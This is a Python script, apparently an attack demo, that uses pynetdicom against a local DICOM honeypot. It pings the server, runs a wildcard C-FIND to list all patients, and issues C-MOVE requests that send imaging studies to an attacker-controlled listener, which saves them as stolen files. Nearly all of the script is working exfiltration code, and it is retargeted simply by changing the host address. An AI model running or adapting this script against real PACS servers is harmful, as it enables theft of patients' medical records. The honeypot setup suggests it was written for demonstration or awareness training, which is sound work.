import time
import threading
from pynetdicom import AE, evt, AllStoragePresentationContexts
from pynetdicom.sop_class import PatientRootQueryRetrieveInformationModelFind, StudyRootQueryRetrieveInformationModelMove, Verification
from pydicom.dataset import Dataset

HONEYPOT_IP = "127.0.0.1"
HONEYPOT_PORT = 11112
ATTACKER_AE = b"APT_SCNNER"
DESTINATION_AE = b"EVIL_STORE"
LISTENER_PORT = 11113

def start_listener():
    """
    [HACKER SERVER SETUP]
    Starts a background DICOM listener (SCP) to receive the stolen files.
    This acts as the attacker's offshore drop-server.
    """
    listener_ae = AE(ae_title=DESTINATION_AE)
    listener_ae.supported_contexts = AllStoragePresentationContexts
    
    def handle_store(event):
        ds = event.dataset
        ds.file_meta = event.file_meta
        
        import os
        os.makedirs("received_images", exist_ok=True)
        filename = f"received_images/stolen_{ds.PatientID}.dcm"
        try:
            ds.save_as(filename, write_like_original=False)
            saved_msg = f"Saved to: {filename}"
        except Exception as e:
            saved_msg = f"Failed to save: {e}"

        print(f"\n   [😈] BOOM! EVIL_STORE RECEIVED STOLEN FILE!")
        print(f"       -> Patient: {ds.PatientName} (ID: {ds.PatientID})")
        print(f"       -> Modality: {ds.Modality}")
        print(f"       -> {saved_msg}")
        return 0x0000

    handlers = [(evt.EVT_C_STORE, handle_store)]
    
    # We use a daemon thread so it exits when the main script finishes
    def run_server():
        # Hide logging for the listener so it doesn't clutter the attacker console
        import logging
        logging.getLogger('pynetdicom').setLevel(logging.CRITICAL)
        listener_ae.start_server(("0.0.0.0", LISTENER_PORT), evt_handlers=handlers)

    t = threading.Thread(target=run_server, daemon=True)
    t.start()
    return t

print("==================================================")
print("⚠️  APT ATTACK SIMULATION SCRIPT INITIATED ⚠️")
print("==================================================")
print(f"[*] Target: {HONEYPOT_IP}:{HONEYPOT_PORT}")

# Start our evil listener
start_listener()
print(f"[*] Started local attacker storage receiver on port {LISTENER_PORT}")
time.sleep(2)

# [ATTACKER SCRIPT SETUP]
# Create an Application Entity (The hacker's identity/client)
ae = AE(ae_title=ATTACKER_AE)
# Define the exact 3 'Dialects' (Presentation Contexts) we need for our attack:
ae.add_requested_context(Verification) # Needed for Stage 0 (Ping)
ae.add_requested_context(PatientRootQueryRetrieveInformationModelFind) # Needed for Stage 1 (Query)
ae.add_requested_context(StudyRootQueryRetrieveInformationModelMove) # Needed for Stage 2 (Theft)

print("\n[Stage 0] Reconnaissance - Pinging Target (C-ECHO)...")
time.sleep(1)
assoc = ae.associate(HONEYPOT_IP, HONEYPOT_PORT)
if assoc.is_established:
    status = assoc.send_c_echo()
    if status and status.Status == 0x0000:
        print("   [+] Target is alive and speaks DICOM!")
    else:
        print("   [-] Target alive but rejected DICOM ping.")
    assoc.release()
else:
    print("[-] Association rejected, aborted or never connected. Is the honeypot running?")
    exit(1)

time.sleep(1)

print("\n[Stage 1] Executing DICOM Database Dump (C-FIND Wildcard)...")
time.sleep(1)

# Connect to the honeypot
assoc = ae.associate(HONEYPOT_IP, HONEYPOT_PORT)
stolen_studies = []

if assoc.is_established:
    print("[+] Association Established. Sending wildcard query (*).")
    
    # [THE MALICIOUS QUERY]
    # We create an empty dataset and use the '*' wildcard to tell the server:
    # "I don't know who is in your database, just give me everything you have."
    ds = Dataset()
    ds.PatientName = "*"
    ds.QueryRetrieveLevel = "STUDY"
    ds.StudyInstanceUID = ""
    ds.PatientID = ""
    
    # Send C-FIND request
    responses = assoc.send_c_find(ds, PatientRootQueryRetrieveInformationModelFind)
    
    count = 0
    for (status, identifier) in responses:
        if status:
            # 0xFF00 and 0xFF01 are 'Pending' statuses (we found a match)
            if status.Status in (0xFF00, 0xFF01):
                count += 1
                uid = getattr(identifier, 'StudyInstanceUID', 'UNKNOWN')
                pid = getattr(identifier, 'PatientID', 'UNKNOWN')
                name = getattr(identifier, 'PatientName', 'UNKNOWN')
                
                print(f"   [+] Discovered Patient: {name} (ID: {pid}) | Study UID: {uid}")
                
                # We'll just steal the first 3 to keep the demo perfectly paced
                if count <= 3: 
                    stolen_studies.append(uid)
            elif status.Status != 0x0000:
                print('   [-] Connection Error:', status)
    
    assoc.release()
    print(f"\n[!] C-FIND Complete. Total Records Found in Honeypot: {count}")
    
else:
    print("[-] Association rejected, aborted or never connected. Is the honeypot running?")
    exit(1)

time.sleep(2)
print("\n[Stage 2] Executing Automated Data Exfiltration (C-MOVE)...")
if not stolen_studies:
    print("[-] No studies found to steal.")
else:
    print(f"[*] Attempting to exfiltrate {len(stolen_studies)} high-value studies to attacker server ({DESTINATION_AE.decode()})...")
    time.sleep(1)
    
    assoc = ae.associate(HONEYPOT_IP, HONEYPOT_PORT)
    if assoc.is_established:
        for uid in stolen_studies:
            print(f"   [*] Sending Exfiltration command for Study UID: {uid}...")
            
            # [THE EXFILTRATION PAYLOAD]
            # We tell the honeypot: "Take this specific medical study, and immediately
            # transfer all of its images to my evil server (DESTINATION_AE)"
            move_ds = Dataset()
            move_ds.QueryRetrieveLevel = "STUDY"
            move_ds.StudyInstanceUID = uid
            
            # Send C-MOVE request
            responses = assoc.send_c_move(move_ds, DESTINATION_AE, StudyRootQueryRetrieveInformationModelMove)
            for (status, identifier) in responses:
                pass # We don't need to print here because the listener will print the BOOM message
            time.sleep(2) # Give it time to transfer the image before closing
            
        assoc.release()
        
print("\n==================================================")
print("🏁 ATTACK SIMULATION COMPLETE")
print("==================================================")
# Give the daemon thread a second to finish printing any last files
time.sleep(1)
